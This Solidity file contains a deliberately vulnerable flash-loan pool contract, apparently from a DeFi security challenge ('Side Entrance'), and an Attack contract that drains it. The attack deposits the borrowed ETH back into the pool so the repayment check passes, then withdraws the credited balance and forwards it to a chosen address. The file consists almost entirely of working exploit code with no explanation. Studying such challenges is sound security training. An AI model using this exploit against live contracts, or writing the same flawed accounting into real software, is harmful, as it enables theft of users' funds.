// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    using Address for address payable;

    mapping(address => uint256) private balances;

    error NotEnoughETHInPool();
    error FlashLoanHasNotBeenPaidBack();

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        if (balanceBefore < amount) revert NotEnoughETHInPool();

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert FlashLoanHasNotBeenPaidBack();
        }
    }
}

contract Attack {
    SideEntranceLenderPool pool;
    address user;

    constructor(address _addr) {
        pool = SideEntranceLenderPool(_addr);
    }

    function setUser(address _user) external {
        user = _user;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function requestForLoan() external {
        pool.flashLoan(1_000e18);
    }

    function withdraw() external {
        pool.withdraw();
    }

    fallback() external payable {
        (bool s, ) = payable(user).call{value: msg.value}("");
        require(s, "Did not pass");
    }

    receive() external payable {
        (bool s, ) = payable(user).call{value: msg.value}("");
        require(s, "Did not pass");
    }
}
